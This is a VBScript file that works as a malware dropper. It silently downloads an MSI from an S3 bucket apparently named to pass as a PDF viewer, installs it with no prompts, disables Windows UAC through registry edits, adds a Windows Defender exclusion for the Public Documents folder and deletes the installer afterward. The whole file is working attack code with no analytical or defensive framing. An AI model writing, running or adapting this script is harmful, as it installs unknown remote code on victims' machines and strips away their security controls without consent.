Option Explicit

Dim shell, fso, msiUrl, msiPath, publicDocs, logFile
Dim cmdDownload, cmdInstall, cmdUacEnableLUA, cmdUacConsent, cmdDefenderExclude

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- configuration ---
msiUrl = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/file.msi"
msiPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\file.msi"
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"
logFile = publicDocs & "\install_log.txt"

' helper to write log
Sub Log(msg)
    On Error Resume Next
    Dim f, ts
    Set f = fso.OpenTextFile(logFile, 8, True) ' append
    f.WriteLine Now & " - " & msg
    f.Close
    On Error GoTo 0
End Sub

Log "Script started."

' --- 1. download MSI silently ---
cmdDownload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
    """[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
    "Invoke-WebRequest -Uri '" & msiUrl & "' -OutFile '" & msiPath & "' -UseBasicParsing"""
Log "Download command: " & cmdDownload
shell.Run cmdDownload, 0, True
Log "Download command finished."

' small delay to ensure file write completes
WScript.Sleep 3000

If Not fso.FileExists(msiPath) Then
    Log "Download failed: file does not exist at " & msiPath
    WScript.Quit 1
Else
    Log "Downloaded file size: " & fso.GetFile(msiPath).Size & " bytes"
End If

' check file size > 0
If fso.GetFile(msiPath).Size = 0 Then
    Log "Download failed: file size is 0."
    WScript.Quit 1
End If

' --- 2. silent install ---
cmdInstall = "msiexec /i """ & msiPath & """ /qn /norestart"
Log "Install command: " & cmdInstall
shell.Run cmdInstall, 0, True
Log "Install command finished."

' --- 3. bypass UAC (disable prompts) ---
cmdUacEnableLUA = "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 0 /f"
cmdUacConsent = "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
shell.Run cmdUacEnableLUA, 0, True
shell.Run cmdUacConsent, 0, True
Log "UAC bypass commands executed."

' --- 4. exclude %PUBLIC%\Documents in Windows Defender ---
cmdDefenderExclude = "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & publicDocs & "'"""
Log "Defender exclusion command: " & cmdDefenderExclude
shell.Run cmdDefenderExclude, 0, True
Log "Defender exclusion command finished."

' --- cleanup ---
If fso.FileExists(msiPath) Then
    fso.DeleteFile msiPath, True
    Log "Deleted downloaded MSI."
End If

Log "Script completed."
Set shell = Nothing
Set fso = Nothing
